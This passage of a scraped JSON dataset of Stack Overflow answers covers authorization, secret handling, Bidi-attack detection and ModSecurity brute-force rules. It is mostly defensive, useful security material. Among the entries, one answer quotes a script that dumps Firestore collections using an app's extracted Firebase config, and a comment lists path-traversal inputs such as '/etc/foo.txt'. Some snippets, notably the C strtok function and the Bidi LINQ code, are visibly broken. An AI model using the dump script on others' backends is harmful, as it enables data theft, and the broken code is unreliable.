tokens: ${response.status}, ${details}`);\n    }\n    const data = await response.json();\n    return data.access_token;\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-12-01T09:07:58",
        "author": "Gary Archer"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73821463/why-authorization-validation-for-firebase-oncall-is-inefficient",
    "title": "Why authorization validation for Firebase onCall is inefficient?",
    "question_id": 73821463,
    "posted_date": "2022-09-22T19:04:08",
    "answers": [
      {
        "answer_id": 78852130,
        "body": "import * as functions from 'firebase-functions';\nimport * as admin from 'firebase-admin';\nadmin.initializeApp();\nconst functionsRegion = functions.region('europe-west3');\nexport const exampleFunction = functionsRegion.https.onCall(async (data, context) => {\n  const req = context.rawRequest\n  const authorizationHeader = req.get('Authorization');\n  if (!authorizationHeader || !authorizationHeader.startsWith('Bearer ')) {\n    throw new functions.https.HttpsError('unauthenticated', 'The function must be called while authenticated.');\n  }\n  const tokenId: string = authorizationHeader.split('Bearer ')[1];\n  try {\n    const decodedToken = await admin.auth().verifyIdToken(tokenId);\n    return { ... }\n  } catch (error) {\n    // Error handling\n  }\n})",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-08-09T05:50:21",
        "author": "Petr Jel&#237;nek"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73550306/spring-authorization-at-package-level-aop",
    "title": "Spring authorization at package level; AOP?",
    "question_id": 73550306,
    "posted_date": "2022-08-30T22:32:23",
    "answers": [
      {
        "answer_id": 73552099,
        "body": "@Aspect\n@Component\npublic class AdminServiceAOPAuthorization {\n    private static final List<String> ALLOWED_ROLES = List.of(\"ADMIN\", \"SUPER_ADMIN\");\n    @Pointcut(\"within(com.example.service.admin.*)\") // <- any method in any class of the package\n    public void adminServiceLayer() {}\n    @Before(\"adminServiceLayer()\")\n    public void authorize(JoinPoint jp) {\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n        if (authentication == null) {\n            // throw some exception depending on the logic\n        }\n        boolean authorized = authentication.getAuthorities().stream()\n                .anyMatch(ga -> ALLOWED_ROLES.contains(ga.getAuthority()));\n        if (!authorized) {\n            throw new AccessDeniedException(\"Access denied\");\n            // log or whatever\n        }\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-08-31T03:10:27",
        "author": "Andrei Titov"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72874753/endpoint-access-depending-on-user-affiliation",
    "title": "Endpoint access depending on user affiliation",
    "question_id": 72874753,
    "posted_date": "2022-07-05T15:45:10",
    "answers": [
      {
        "answer_id": 72970564,
        "body": "C#\nusing Microsoft.AspNetCore.Http;\nusing Microsoft.AspNetCore.Mvc;\nusing Microsoft.AspNetCore.Mvc.Filters;\nusing System.Linq;\nusing System.Security.Claims;\nnamespace Api\n{\n\tpublic class DepartmentAuthorizationFilter : IAuthorizationFilter\n\t{\n\t\tpublic void OnAuthorization(AuthorizationFilterContext context)\n\t\t{\n\t\t\tHttpContext httpContext = context.HttpContext;\n\t\t\tif (!httpContext.User.Identity.IsAuthenticated)\n\t\t\t{\n\t\t\t\tcontext.Result = new ForbidResult();\n\t\t\t\treturn;\n\t\t\t}\n            // Retrieve the UserId\n\t\t\tClaim userIdClaim = httpContext.User.Claims.Single(x => x.Type == \"id\");\n\t\t\tint userId = int.Parse(userIdClaim.Value);\n            // Retrieve the requested department\n\t\t\tint departmentId = int.Parse(httpContext.Request.RouteValues[\"departmentId\"].ToString());\n\t\t\tif (!CanAccessDepartment(userId, departmentId))\n\t\t\t{\n\t\t\t\tcontext.Result = new ForbidResult();\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tprivate bool CanAccessDepartment(int userId, int departmentId)\n\t\t{\n\t\t\t// Do required checks\n\t\t}\n\t}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-07-13T13:48:04",
        "author": "Randy"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71961903/api-authorization-tool",
    "title": "API Authorization Tool",
    "question_id": 71961903,
    "posted_date": "2022-04-21T19:34:12",
    "answers": [
      {
        "answer_id": 72540448,
        "body": "const { Auth0FgaApi } = require('@auth0/fga')\nconst express = require('express')\nconst app = express()\nconst fgaClient = new Auth0FgaApi({\n     storeId: process.env.FGA_STORE_ID,  // Fill this in!\n     clientId: process.env.FGA_CLIENT_ID,  // Fill this in!\n     clientSecret: process.env.FGA_CLIENT_SECRET // Fill this in!\n});\napp.get('/objects/:id', async (req, res) => {\n    try {\n        const { allowed } = await fgaClient.check({\n            tuple_key: {\n                user: req.query.user,\n                relation: 'reader',\n                object: \"object:\" + req.params.id\n            }\n        });\n        if (!allowed) {\n            res.status(403).send(\"Unauthorized!\")\n        } else {\n            res.status(200).send(\"Authorized!\")\n        }\n    } catch (error) {\n        res.status(500).send(error)\n    }\n});\nconst port = 3000\napp.listen(port, () => {\n    console.log(`Example app listening on port ${port}`)\n})",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-06-08T01:25:38",
        "author": "Maria Ines Parnisari"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71621549/pod-crashloopbackoff-error-with-automountserviceaccounttoken-set-to-false",
    "title": "Pod CrashLoopBackOff error with automountServiceAccountToken set to false",
    "question_id": 71621549,
    "posted_date": "2022-03-25T14:25:59",
    "answers": [
      {
        "answer_id": 71645762,
        "body": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-scheduler\n  namespace: kube-system\n...\nspec:\n  ...\n  template:\n    metadata:\n      labels:\n        app: my-scheduler\n    spec:\n      containers:\n      - image: <YOUR_IMAGE>\n        imagePullPolicy: Always\n        name: my-scheduler\n        volumeMounts:\n        - mountPath: /var/run/secrets/kubernetes.io/serviceaccount\n          name: kube-api-access\n          readOnly: true\n      serviceAccountName: my-scheduler\n      volumes:\n      - name: kube-api-access\n        projected:\n          defaultMode: 420\n          sources:\n          - serviceAccountToken:\n              expirationSeconds: 3607\n              path: token\n          - configMap:\n              items:\n              - key: ca.crt\n                path: ca.crt\n              name: kube-root-ca.crt\n          - downwardAPI:\n              items:\n              - fieldRef:\n                  apiVersion: v1\n                  fieldPath: metadata.namespace\n                path: namespace",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-03-28T06:12:20",
        "author": "mozello"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71352153/export-explicit-acl-permissions",
    "title": "Export Explicit ACL Permissions",
    "question_id": 71352153,
    "posted_date": "2022-03-04T08:29:39",
    "answers": [
      {
        "answer_id": 71352721,
        "body": "Get-ChildItem O:\\ADSMO -Directory -Recurse | ForEach-Object {\n    foreach($access in (Get-Acl $_.FullName).Access) {\n        # if `IsInherited = $true` go to next iteration\n        if($access.IsInherited) { continue }\n        [pscustomobject]@{\n            FolderName        = $_.Name\n            FolderPath        = $_.FullName\n            IdentityReference = $access.IdentityReference\n            FileSystemRights  = $access.FileSystemRights\n        }\n    }\n} | Export-Csv 'C:\\path\\to\\acls.csv' -NoTypeInformation",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2022-03-04T09:15:08",
        "author": "Santiago Squarzon"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70964012/is-there-a-stack-overflow-danger-with-strtok-here",
    "title": "Is there a stack overflow danger with strtok here?",
    "question_id": 70964012,
    "posted_date": "2022-02-02T18:03:36",
    "answers": [
      {
        "answer_id": 70964801,
        "body": "void remove_spaces(char *output, size_t outmax,\n                   /* This version doesn't modify input */\n                   const char *input) {\n    if (outmax = 0) return;\n    char *token = strtok(input, \" \");\n    char *outlimit = output + outmax;\n    while ( *(input += strspn(input, \" \")) ) {\n        size_t cpylen = (tokelen < outlimit - outptr)\n                           ? tokelen\n                           : outlimit - outptr - 1;\n        memcpy(output, input, cpylen);\n        output += cpylen;\n        input += tokelen;\n    }\n    *output = 0;\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-02-02T20:06:34",
        "author": "rici"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70138937/how-are-variables-stored-in-memory-in-unity-and-can-a-public-method-with-return",
    "title": "How are variables stored in memory in Unity and can a public method with return type be intercepted at runtime?",
    "question_id": 70138937,
    "posted_date": "2021-11-27T16:42:32",
    "answers": [
      {
        "answer_id": 70145922,
        "body": "public class MemoryObfuscatedInt\n{\n    private int _secret;\n    private int _obfuscatedValue;\n    // This value will always have the real, visual number - only here to catch potential cheaters\n    private int _honeyPotValue;\n    public MemoryObfuscatedInt()\n    {\n        _secret = Random.Range(100, 1000);\n    }\n    public MemoryObfuscatedInt(int secret)\n    {\n        _secret = secret;\n    }\n    public bool DidPlayerCheat()\n    {\n        return _honeyPotValue != Value;\n    }\n    public int Value\n    {\n        get\n        {\n            return _obfuscatedValue / _secret;\n        }\n        set\n        {\n            _obfuscatedValue = value * _secret;\n            _honeyPotValue = value;\n        }\n    }\n    public static implicit operator int(MemoryObfuscatedInt i) => i.Value;\n    public static explicit operator MemoryObfuscatedInt(int toObfuscate) => new MemoryObfuscatedInt { Value = toObfuscate };\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-11-28T12:40:05",
        "author": "Ron"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69853942/how-to-automatically-detect-a-unicode-bidi-attack-within-c-source-code",
    "title": "How to automatically detect a Unicode Bidi &quot;attack&quot; within C# source code?",
    "question_id": 69853942,
    "posted_date": "2021-11-05T09:22:27",
    "answers": [
      {
        "answer_id": 69854121,
        "body": "static Boolean ContainsBidi( String text )\n{\n    for( Int32 i = 0; i < text.Length; i++ )\n    {\n        if( IsBidi( text[i] ) ) return true;\n    }\n    return false;\n}\nstatic Boolean IsBidi( Char c )\n{\n    switch( c )\n    {\n    case '\\u2066': // LEFT-TO-RIGHT ISOLATE\n    case '\\u2067': // RIGHT-TO-LEFT ISOLATE\n    case '\\u2068': // FIRST-STRONG ISOLATE\n    case '\\u202A': // LEFT-TO-RIGHT EMBEDDING\n    case '\\u202B': // RIGHT-TO-LEFT EMBEDDING\n    case '\\u202D': // LEFT-TO-RIGHT OVERRIDE\n    case '\\u202E': // RIGHT-TO-LEFT OVERRIDE\n        return true;\n    default:\n        return false;\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-11-05T09:34:37",
        "author": "Dai"
      },
      {
        "answer_id": 69854121,
        "body": "static Boolean IsBidi_Rtl( Char c )\n{\n    switch( c )\n    {\n    case '\\u2067': // RIGHT-TO-LEFT ISOLATE\n//  case '\\u2068': // FIRST-STRONG ISOLATE // TODO\n    case '\\u202B': // RIGHT-TO-LEFT EMBEDDING\n    case '\\u202E': // RIGHT-TO-LEFT OVERRIDE\n        return true;\n    default:\n        return false;\n    }\n}\nstatic Boolean IsRiskyBidi( String text )\n{\n    List<Int32> bidiIndexes = text\n        .Select( ( c, idx ) => IsBidi( c ) ? idx : -1 )\n        .Where( idx => idx >= 0 )\n        .ToList();\n    var runs = bidiIndexes\n        .Lead(1) // TODO:\n        .Select( ( Int32 idx, Int32 nextIdx ) => text.AsSpan( start: idx + 1, length: nextIdx - idx ) ) // +1 to skip the BiDi char\n        .Select( run => (\n            text: run,\n            isRtl: IsBidi_Rtl( run[0] ),\n            countLatin1: run.Count( c => Char.IsLetterOrDigit( c ) && c <= 0xFF ),\n            countNonLatin1: run.Count( c => c > 0xFF ) )\n        )\n        .Select(  )\n        .ToList();\n    // If there are any RTL runs of text with, say, more than 50% Latin1 characters then that's pretty sus...\n    var dodgyRuns = runs\n        .Where( run => run.isRtl && run.countLatin1 >= run.text.Length / 2 )\n        .ToList();\n\n    return dodgyRuns.Any();\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-11-05T09:34:37",
        "author": "Dai"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68256481/how-can-i-make-my-android-app-more-secure",
    "title": "How can I make my Android app more secure?",
    "question_id": 68256481,
    "posted_date": "2021-07-05T08:52:01",
    "answers": [
      {
        "answer_id": 68269300,
        "body": ">const firebase = require(\"firebase\");\n>const util = require('util')\n>\n>var firebaseConfig = {\n>    apiKey: \"<redacted>\",\n>    authDomain: \"<redacted>\",\n>    databaseURL: \"<redacted>\",\n>    projectId: \"<redacted>\",\n>    storageBucket: \"<redacted>\",\n>    messagingSenderId: \"<redacted>\",\n>    appId: \"<redacted>\",\n>};\n>\n>firebase.initializeApp(firebaseConfig);\n>var database = firebase.firestore();\n>\n>[\"<redacted>\", \"<redacted>\"].forEach(collection => {\n>    database.collection(collection).get().then(function(querySnapshot) {\n>        console.log(`Data for ${collection}:`);\n>        querySnapshot.forEach((doc) => {\n>            var data   \u200b= doc.data();\n>            console.log(util.inspect(data, false, null, true));\n>        });\n>    }).catch(function (error) {\n>        console.log(\"Error getting document:\", error);\n>    });\n>});\n>",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-07-06T06:56:55",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66089030/make-php-fpm-security-limit-extensions-case-insensitive",
    "title": "Make PHP-FPM security.limit_extensions case insensitive",
    "question_id": 66089030,
    "posted_date": "2021-02-07T09:29:37",
    "answers": [
      {
        "answer_id": 66175504,
        "body": "security.limit_extensions = .PHP .PHP3 .PHP4 .PHP5 .PHP7 .PHPS .PHPs .PHp .PHp3 .PHp4 .PHp5 .PHp7 .PHpS .PHps .PhP .PhP3 .PhP4 .PhP5 .PhP7 .PhPS .PhPs .Php .Php3 .Php4 .Php5 .Php7 .PhpS .Phps .pHP .pHP3 .pHP4 .pHP5 .pHP7 .pHPS .pHPs .pHp .pHp3 .pHp4 .pHp5 .pHp7 .pHpS .pHps .phP .phP3 .phP4 .phP5 .phP7 .phPS .phPs .php .php3 .php4 .php5 .php7 .phpS .phps .PHTML .PHTMl .PHTmL .PHTml .PHtML .PHtMl .PHtmL .PHtml .PhTML .PhTMl .PhTmL .PhTml .PhtML .PhtMl .PhtmL .Phtml .pHTML .pHTMl .pHTmL .pHTml .pHtML .pHtMl .pHtmL .pHtml .phTML .phTMl .phTmL .phTml .phtML .phtMl .phtmL .phtml .HTML .HTMl .HTmL .HTml .HtML .HtMl .HtmL .Html .hTML .hTMl .hTmL .hTml .htML .htMl .htmL .html .JS .Js .jS .js",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-02-12T11:29:45",
        "author": "dumbass"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63940699/asp-net-web-api-verify-if-client-has-specific-certifcate-installed",
    "title": "ASP.NET Web API: verify if client has specific certifcate installed",
    "question_id": 63940699,
    "posted_date": "2020-09-17T10:51:14",
    "answers": [
      {
        "answer_id": 76969214,
        "body": "builder.Services.AddAuthentication(CertificateAuthenticationDefaults.AuthenticationScheme)\n    .AddCertificate(options =>\n    {\n        options.Events = new CertificateAuthenticationEvents\n        {\n            OnCertificateValidated = context =>\n            {\n                var claims = new[]\n                {\n                    new Claim(ClaimTypes.NameIdentifier, context.ClientCertificate.Subject, ClaimValueTypes.String, context.Options.ClaimsIssuer),\n                    new Claim(ClaimTypes.Name, context.ClientCertificate.Subject, ClaimValueTypes.String, context.Options.ClaimsIssuer)\n                };\n                context.Principal = new ClaimsPrincipal(new ClaimsIdentity(claims, context.Scheme.Name));\n                context.Success();\n                return Task.CompletedTask;\n            }\n        };\n    });",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-08-24T08:22:16",
        "author": "Julian"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63550733/why-wont-os-environ-get-return-the-new-value-set-in-bash-profile",
    "title": "Why won&#39;t os.environ.get return the new value set in bash profile?",
    "question_id": 63550733,
    "posted_date": "2020-08-23T14:37:53",
    "answers": [
      {
        "answer_id": 63550810,
        "body": "#!/usr/bin/env python\n\"\"\"Django's command-line utility for administrative tasks.\"\"\"\nimport os\nimport sys\nfrom dotenv import load_dotenv, find_dotenv\nload_dotenv(find_dotenv(filename='.environment'))\ndef main():\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'project.settings')\n    try:\n        from django.core.management import execute_from_command_line\n    except ImportError as exc:\n        raise ImportError(\n            \"Couldn't import Django. Are you sure it's installed and \"\n            \"available on your PYTHONPATH environment variable? Did you \"\n            \"forget to activate a virtual environment?\"\n        ) from exc\n    execute_from_command_line(sys.argv)\nif __name__ == '__main__':\n    main()",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2020-08-23T14:46:51",
        "author": "markwalker_"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60023327/can-you-limit-the-access-for-google-cloud-api-credentials",
    "title": "Can you limit the access for Google cloud API credentials",
    "question_id": 60023327,
    "posted_date": "2020-02-01T23:56:28",
    "answers": [
      {
        "answer_id": 60023510,
        "body": "# Import the Secret Manager client library.\nfrom google.cloud import secretmanager_v1beta1 as sm\n# GCP project in which to store secrets in Secret Manager.\nproject_id = 'YOUR_PROJECT_ID'\n# ID of the secret to create.\nsecret_id = 'YOUR_SECRET_ID'\n# Create the Secret Manager client.\nclient = sm.SecretManagerServiceClient()\n# Build the parent name from the project.\nparent = client.project_path(project_id)\n# Create the parent secret\nsecret = client.create_secret(parent, secret_id, {\n    'replication': {\n        'automatic': {},\n    },\n})\n# Add the api key\nversion = client.add_secret_version(secret.name, {'data': b'my-google-api-credentials'})\n# Access the api key\nresponse = client.access_secret_version(version.name)\n# Now you have your decoded api credentials you can use for authentication\npayload = response.payload.data.decode('UTF-8')",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-02-02T00:37:05",
        "author": "Jason R Stevens CFA"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57790561/my-sql-server-2008-r2-clr-works-sometimes-but-not-others-but-why",
    "title": "My SQL Server 2008 R2 CLR works sometimes, but not others, but why?",
    "question_id": 57790561,
    "posted_date": "2019-09-04T10:26:42",
    "answers": [
      {
        "answer_id": 57791133,
        "body": "Msg 10314, Level 16, State 11, Line 1\nAn error occurred in the Microsoft .NET Framework while trying to load assembly id 65544. The server may be running out of resources, or the assembly may not be trusted with PERMISSION_SET = EXTERNAL_ACCESS or UNSAFE. Run the query again, or check documentation to see how to solve the assembly trust issues. For more information about this error:\nSystem.IO.FileLoadException: Could not load file or assembly 'clr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An error relating to security occurred. (Exception from HRESULT: 0x8013150A)\nSystem.IO.FileLoadException:\n   at System.Reflection.Assembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, Assembly locationHint, StackCrawlMark& stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection)\n   at System.Reflection.Assembly.InternalLoad(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark& stackMark, Boolean forIntrospection)\n   at System.Reflection.Assembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark& stackMark, Boolean forIntrospection)\n   at System.Reflection.Assembly.Load(String assemblyString)",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-09-04T11:01:00",
        "author": "Mark Roworth"
      },
      {
        "answer_id": 58329393,
        "body": "        DECLARE @SQL NVARCHAR(MAX) = N'';\n\n        SELECT @SQL += N'DROP FUNCTION dbo.' + obj.[name] + N';'\n                       + NCHAR(0x0D) + NCHAR(0x0A) -- CR+LF\n        FROM   sys.assembly_modules asmd\n        INNER JOIN sys.assemblies assm\n                ON assm.[assembly_id] = asmd.[assembly_id]\n        INNER JOIN sys.objects obj\n                ON obj.[object_id] = asmd.[object_id]\n        WHERE  assm.[name] = N'{assembly_name_here}';\n\n        PRINT @SQL; -- DEBUG (else comment out and UNcomment line below)\n        --EXEC (@SQL);",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-10-10T14:53:42",
        "author": "Solomon Rutzky"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57044106/can-i-do-binary-taint-analysis",
    "title": "Can I do binary taint analysis?",
    "question_id": 57044106,
    "posted_date": "2019-07-15T12:51:21",
    "answers": [
      {
        "answer_id": 57082936,
        "body": "--- a.py\t2019-07-17 21:28:25.828014823 +0200\n+++ b.py\t2019-07-17 21:27:25.988013339 +0200\n@@ -29,8 +29,7 @@\n     0x4005b4: b\"\\x89\\x45\\xf4\",              # mov    %eax,-0xc(%rbp)\n     0x4005b7: b\"\\xe9\\xd1\\xff\\xff\\xff\",          # jmpq   40058d <func_0+0x1d>\n     0x4005bc: b\"\\x8b\\x75\\xf8\",              # mov    -0x8(%rbp),%esi\n-    0x4005bf: b\"\\x48\\xbf\\xa4\\x08\\x40\\x00\\x00\",  # movabs $0x4008a4,%rdi\n-    0x4005c6: b\"\\x00\\x00\\x00\",\n+    0x4005bf: b\"\\x48\\xbf\\xa4\\x08\\x40\\x00\\x00\\x00\\x00\\x00\",  # movabs $0x4008a4,%rdi\n     0x4005c9: b\"\\xb0\\x00\",                  # mov    $0x0,%al\n     0x4005cb: b\"\\xe8\\x90\\xfe\\xff\\xff\",          # callq  400460 <printf@plt>\n     0x4005d0: b\"\\x89\\x45\\xf0\",              # mov    %eax,-0x10(%rbp)",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2019-07-17T15:29:43",
        "author": "Jonathan Salwan"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57026633/set-cookie-header-is-removed-from-response-spring-boot",
    "title": "Set-Cookie header is removed from response, Spring boot",
    "question_id": 57026633,
    "posted_date": "2019-07-14T06:42:58",
    "answers": [
      {
        "answer_id": 57033999,
        "body": "$ curl -v http://127.0.0.1:8080/some\n*   Trying 127.0.0.1...\n* TCP_NODELAY set\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /some HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/1.2.3\n> Accept: */*\n>\n< HTTP/1.1 200\n< Set-Cookie: yes=it_is_possible\n< X-Content-Type-Options: nosniff\n< X-XSS-Protection: 1; mode=block\n< Cache-Control: no-cache, no-store, max-age=0, must-revalidate\n< Pragma: no-cache\n< Expires: 0\n< X-Frame-Options: DENY\n< Content-Type: text/plain;charset=UTF-8\n< Content-Length: 16\n< Date: Mon, 15 Jul 2019 06:01:39 GMT\n<\n* Curl_http_done: called premature == 0\n* Connection #0 to host 127.0.0.1 left intact\nSome test string",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-07-15T02:07:25",
        "author": "Eugene"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54640501/bulletproof-way-to-prevent-user-specified-file-names-from-using-relative-path-el",
    "title": "Bulletproof way to prevent user specified file names from using relative path elements in a Node.JS app?",
    "question_id": 54640501,
    "posted_date": "2019-02-11T18:09:31",
    "answers": [
      {
        "answer_id": 72129506,
        "body": "`js\nconst fs = require('fs');\nconst path = require('path');\ncheckUserSuppliedFilenameExists(req, res) {\n  if(!req.body.fileName) {\n    return res.status(400).json({ message: \"missing required parameters\" });\n  }\n\n  /**\n   * strip any potentially harmful stuff from the start of the string\n   * will return the following:\n   * \"foo.txt\" => \"foo.txt\"\n   * \"foo\" => \"foo\"\n   * \"../../foo.txt\" => \"foo.txt\"\n   * \"/etc/foo.txt\" => \"foo.txt\"\n   * undefined => TypeError\n   * null => TypeError\n   */\n  let suppliedFilename = path.basename(req.body.fileName);\n  // build the path to the file in the expected directory\n  // using __dirname to build relatively from the script currently executing\n  let filePath = path.resolve(__dirname, `../my-specified-directory/${suppliedFilename}`);\n  // check if it exists\n  if(!fs.existsSync( filePath ) ) {\n    return res.status(400).json({ message: \"file doesn't exist stoopid\" });\n  }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-05-05T11:08:26",
        "author": "DazBaldwin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54548296/bouncycastle-parameter-object-not-a-ecparameterspec",
    "title": "BouncyCastle Parameter Object Not a ECParameterSpec",
    "question_id": 54548296,
    "posted_date": "2019-02-06T02:08:10",
    "answers": [
      {
        "answer_id": 58386279,
        "body": "  private static KeyPairGenerator g\n\n  static{\n    try {\n       cleanEnvAndInitG(CURVE_NAME);\n    } catch (NoSuchAlgorithmException e) {\n       Random r = new Random();\n       //sleep 30ms~300ms\n       int time= r.nextInt(300-30+1) + 30;\n       Thread.sleep(time);\n       cleanEnvAndInitG(CURVE_NAME);\n       logger.info(e.getMessage(), e);\n    }catch( ...\n }\n    public static void cleanEnvAndInitG(String curveName) throws NoSuchAlgorithmException, NoSuchProviderException, InvalidAlgorithmParameterException {\n        Security.removeProvider(ECDH_PROVIDER);\n        Security.addProvider(new BouncyCastleProvider());\n        ECParameterSpec ecSpec = ECNamedCurveTable.getParameterSpec(curveName);\n        keyPairGenerator = KeyPairGenerator.getInstance(ECDH_ALGORITHM, ECDH_PROVIDER);\n        keyPairGenerator.initialize(ecSpec, new SecureRandom());\n    }",
        "score": -1,
        "is_accepted": false,
        "creation_date": "2019-10-14T22:10:23",
        "author": "Simple"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/46841086/validate-base64-encoded-image-from-mime-byte",
    "title": "Validate base64 encoded image from mime byte",
    "question_id": 46841086,
    "posted_date": "2017-10-19T21:21:36",
    "answers": [
      {
        "answer_id": 62028279,
        "body": "function imgMime($imgBytes){\n    if(is_null($imgBytes)){\n        return(false);\n    }\n    if(strlen($imgBytes)<12){\n        return(false);\n    }\n    $finfo = new finfo(FILEINFO_MIME_TYPE);\n    $mime=$finfo->buffer($imgBytes);\n    if(strncmp($mime, \"image/\", 6) != 0){\n        return(false);\n    }\n    return($mime);\n}\n$imageBytes=base64_decode($imageBase64Str,true);\nif(!$imageBytes){\n    throw new Exception(\"cannot decode image base64\");\n}\n$imageMime=imgMime($imageBytes);\nif(!$imageMime){\n    throw new Exception(\"cannot recognize image mime\");\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-05-26T13:47:57",
        "author": "luvzfootball"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/38656053/protect-brute-force-attack-mod-security",
    "title": "protect brute force attack mod security",
    "question_id": 38656053,
    "posted_date": "2016-07-29T06:05:50",
    "answers": [
      {
        "answer_id": 64389056,
        "body": "############################################\nhttpd.conf\n###########################################\n#enabling 2 modules\nLoadModule unique_id_module modules/mod_unique_id.so\nLoadModule security2_module modules/mod_security2.so\n<IfModule security2_module>\n\tInclude conf/extra/modsecurity-minimal.conf\n</IfModule>\n<IfModule mod_security2.c>\n\tSecRuleEngine On\n\t\t#SecRequestBodyAccess On\n\tSecResponseBodyAccess On\n\t\t#Create/Find any dir where modSecurity will persist data e.g\n\tSecDataDir \"/usr/local/apache/logs/data\"\n</IfModule>\n##################################\nContent of modsecurity configuration to prevent brute-force attack when basic auth is enabled in apache\nconf/extra/modsecurity-minimal.conf\n##################################\n#timer is set for 5 min(3000sec), for blocking one IP-address after 10 unsuccessfull tries,\n#user will be blocked for 30 seconds after 3 bad tries.\n#USER and IP false-counters live within 5 minutes, then are being reset to 0 (so 3 bad tries per username per 5 minutes are allowed)\n# (and 10 total bad tries from one IP per 5 minutes are allowed)\n  # Enforce an existing IP address block\n  SecRule IP:bf_block \"@eq 1\" \\\n        \"id:'2000004',phase:4,deny,\\\n         logdata:'Access denied [by IP] IP: @%{REMOTE_ADDR}, user: %{USER.name}'\n\n\n\tSecRule USER:bf_block \"@eq 1\" \\\n                \"id:'2000005',phase:4,deny,\\\n                logdata:'Access denied [by USER] IP: @%{REMOTE_ADDR}, user: %{USER.name}'\n\n\tSecRule REQUEST_HEADERS:authorization \"Basic ([a-zA-Z0-9]+=*)$\" \"phase:3,nolog,pass,id:2000012,chain,capture\"\n\t\tSecRule TX:1 \"^([-a-zA-Z0-9_]+):\" \"t:base64Decode,chain,capture\"\n\t\tSecAction initcol:USER=%{TX.1},setvar:USER.name=%{TX.1},initcol:IP=%{REMOTE_ADDR}\n\n\n\tSecRule RESPONSE_STATUS \"401\" \\\n\t\t\"phase:5,pass,id:2000015,chain,logdata:'basic auth de @%{IP}, var: %{IP.begin}, user: %{USER.name}, ufc: %{USER.user_false_counter}, block: %{USER.bf_block}, IPblock: %{IP.bf_block}, ifc: %{IP.ip_false_counter}'\"\n\t\tSecAction setvar:USER.user_false_counter=+1,setvar:IP.ip_false_counter=+1,expirevar:USER.user_false_counter=300,expirevar:IP.ip_false_counter=300\n\t# Check for too many failures for a single username, blocking 30 seconds after 3 tries\n    SecRule USER:user_false_counter \"@ge 3\" \\\n                \"id:'2000020',phase:3,t:none,pass,\\\n                setvar:USER.bf_block,\\\n                setvar:!USER.user_false_counter,\\\n                expirevar:USER.bf_block=30\"\n\t# Check for too many failures from a single IP address. Block for 5 minutes after 10 tries.\n        SecRule IP:ip_false_counter \"@ge 10\" \\\n                \"id:'2000021',phase:3,pass,t:none, \\\n                setvar:IP.bf_block,\\\n                setvar:!IP.ip_false_counter,\\\n                expirevar:IP.bf_block=300\"",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-10-16T08:18:17",
        "author": "hhblaze"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/15096756/check-if-user-is-a-local-admin-on-external-machine",
    "title": "Check if user is a local admin on external machine",
    "question_id": 15096756,
    "posted_date": "2013-02-26T13:39:02",
    "answers": [
      {
        "answer_id": 15098451,
